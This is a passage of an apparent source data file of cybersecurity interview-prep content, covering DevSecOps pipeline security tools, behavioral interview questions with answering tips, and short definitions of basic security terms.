6. Secrets in environment variables or source code
7. Logging disabled (CloudTrail, VPC Flow Logs)

Key tools: AWS Security Hub, AWS Config, Azure Defender, GCP Security Command Center`,
        tags: ["cloud", "aws", "azure", "devsecops"],
        difficulty: "Medium",
      },
      {
        q: "What is DevSecOps? How do you integrate security into CI/CD?",
        a: `DevSecOps: Integrating security practices into every phase of the software development lifecycle (SDLC), making security everyone's responsibility rather than an afterthought.

Shift Left: Move security testing earlier in the pipeline — finding a bug in development costs 10x less than in production.

Security gates in CI/CD pipeline:

Pre-Commit:
✅ Pre-commit hooks — check for secrets before they enter git
✅ IDE security plugins (Snyk, SonarLint)

Build Stage:
✅ SAST (Static Application Security Testing) — analyze source code
   Tools: SonarQube, Semgrep, Checkmarx, CodeQL (GitHub)
✅ Secret scanning — detect API keys, passwords in code
   Tools: GitLeaks, Trufflehog, GitHub Secret Scanning

Test Stage:
✅ DAST (Dynamic Application Security Testing) — test running app
   Tools: OWASP ZAP, Burp Suite Enterprise
✅ Dependency scanning — known CVEs in libraries
   Tools: Snyk, Dependabot, OWASP Dependency-Check
✅ Container scanning — vulnerable base images
   Tools: Trivy, Grype, Clair, AWS ECR scanning
✅ IaC scanning — Terraform/CloudFormation misconfigurations
   Tools: Checkov, tfsec, Terrascan

Deploy Stage:
✅ Image signing and verification (Cosign, Notary)
✅ Admission controllers in Kubernetes (OPA/Gatekeeper)
✅ Infrastructure hardening (CIS benchmarks)

Runtime:
✅ RASP (Runtime Application Self-Protection)
✅ WAF, IDS/IPS
✅ Continuous monitoring and alerting`,
        tags: ["devsecops", "cicd", "cloud", "sast", "dast"],
        difficulty: "Hard",
      },
    ],
  },
];

export const behavioralQuestions = [
  {
    q: "Tell me about a time you found a critical vulnerability. What did you do?",
    framework: "STAR (Situation, Task, Action, Result)",
    tips: [
      "Describe the vulnerability technically but clearly",
      "Explain your responsible disclosure process",
      "Highlight communication with stakeholders",
      "Quantify the impact (systems affected, risk score)",
      "Show what you learned and how you prevented recurrence",
    ],
  },
  {
    q: "How do you stay current with cybersecurity threats and vulnerabilities?",
    framework: "Show genuine interest and a structured approach",
    tips: [
      "Follow CISA KEV catalog and NVD for CVEs",
      "Read Krebs on Security, The Hacker News, security blogs",
      "CTFs (TryHackMe, HackTheBox, CTFtime)",
      "SANS Internet Stormcast, security podcasts",
      "Twitter/X security community (@taviso, @thegrugq, @briankrebs)",
      "Vendor security advisories in your area of focus",
    ],
  },
  {
    q: "How would you explain a complex security risk to a non-technical executive?",
    framework: "Business risk translation",
    tips: [
      "Avoid jargon — use business language",
      "Quantify risk in dollars, customers affected, regulatory fines",
      "Use analogies (leaving the office unlocked vs. patching a vulnerability)",
      "Give 3 options: fix now, accept risk, accept risk with compensating controls",
      "Lead with impact, follow with technical detail only if asked",
    ],
  },
  {
    q: "You discover a colleague has been reusing their admin password across 10 systems. What do you do?",
    framework: "Ethical judgment + process following",
    tips: [
      "Don't shame the colleague — approach constructively",
      "Explain the risk (credential stuffing, one breach = all breached)",
      "Follow your organization's security policy",
      "Recommend a password manager solution",
      "If it's a policy violation, escalate appropriately",
      "Use it as a training opportunity, not a punishment",
    ],
  },
];

export const quickFireFacts = [
  { q: "What is the CIA Triad?", a: "Confidentiality, Integrity, Availability — the 3 pillars of information security." },
  { q: "What is a zero-day?", a: "A vulnerability unknown to the vendor — zero days of advance warning before exploitation." },
  { q: "Port for RDP?", a: "3389 (TCP) — highest risk exposed service." },
  { q: "CVSS Critical score range?", a: "9.0–10.0" },
  { q: "What does SIEM stand for?", a: "Security Information and Event Management" },
  { q: "What is IOC?", a: "Indicator of Compromise — artifacts indicating a system has been breached (IP, hash, domain, registry key)." },
  { q: "Difference: vulnerability vs exploit vs risk?", a: "Vulnerability = weakness. Exploit = code to attack it. Risk = likelihood × impact." },
  { q: "What is a DMZ?", a: "Demilitarized Zone — network segment between external internet and internal network for public-facing servers." },
  { q: "What is OSINT?", a: "Open Source Intelligence — gathering info from publicly available sources for reconnaissance." },
  { q: "What is a WAF?", a: "Web Application Firewall — Layer 7 protection for web apps against SQLi, XSS, etc." },
  { q: "What is least privilege?", a: "Users/systems only have permissions they absolutely need — minimizes blast radius." },
  { q: "What is lateral movement?", a: "Moving from one compromised system to other systems in a network to reach higher-value targets." },
  { q: "Windows Event ID for failed login?", a: "4625 — Failed logon attempt. 4624 = successful. 4740 = account lockout." },
  { q: "What is a honeypot?", a: "Decoy system designed to attract and study attackers without exposing real assets." },
  { q: "What is OPSEC?", a: "Operations Security — protecting information that could give adversaries an advantage." },
];
